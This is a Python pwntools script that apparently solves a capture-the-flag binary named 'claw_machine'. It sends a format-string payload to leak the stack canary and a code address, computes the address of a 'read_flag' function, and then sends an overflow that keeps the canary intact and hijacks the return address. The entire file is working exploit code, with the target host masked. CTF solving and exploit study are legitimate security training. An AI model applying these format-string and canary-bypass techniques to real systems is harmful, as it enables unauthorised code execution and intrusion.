import pwn

pwn.context.arch='amd64'

#io = pwn.gdb.debug("./claw_machine", gdbscript='continue', log_level='debug')
io = pwn.process("./claw_machine")
io = pwn.remote("XXX.XXX.XXX.XXX", 13337)
#print("[*] Wait for address...")
#io.recvuntil(b'\'')
#addr = int(io.recvuntil(b"\'.")[:-2], 0)
#print("[+] Got address: " + hex(addr))
io.sendline(b"9")
io.sendline(b"y")
# dump canary
print('[*] Leaking canary and offset...')
io.sendline(b"%25$p %26$p")
io.recvuntil(b'Thank you for giving feedback ')
leak_str=io.recvline()[:-1].split(b' ')
#print(str(canary_str))
canary = pwn.pack(int(leak_str[0], 16) ,endianness='little')
canary = pwn.pack(int(leak_str[0], 16), endianness='little')
libc_csu_init_offset = int(leak_str[1], 16)
read_flag_offset = 0x9ec
read_flag = libc_csu_init_offset - read_flag_offset
read_flag_b = pwn.pack(read_flag, endianness='little')
print('[+] Got canary: ' + hex(int(leak_str[0], 16)))
print('[+] Got __libc_csu_init offset: ' + hex(libc_csu_init_offset))
print('[+] Calculated read_flag offset: ' + hex(read_flag))
print('[*] Pwn...')
io.sendline(b'A'*72 + canary + b'B'*8 + read_flag_b)
io.interactive()
#io.sendline(shellcode_encoded + padding + pwn.pack(addr, word_size=8*6))

#io.sendline(b"A"*64 + b"B"*8 + b"\xcf\x08")
#print(io.recvrepeat(0.2))
#io.interactive()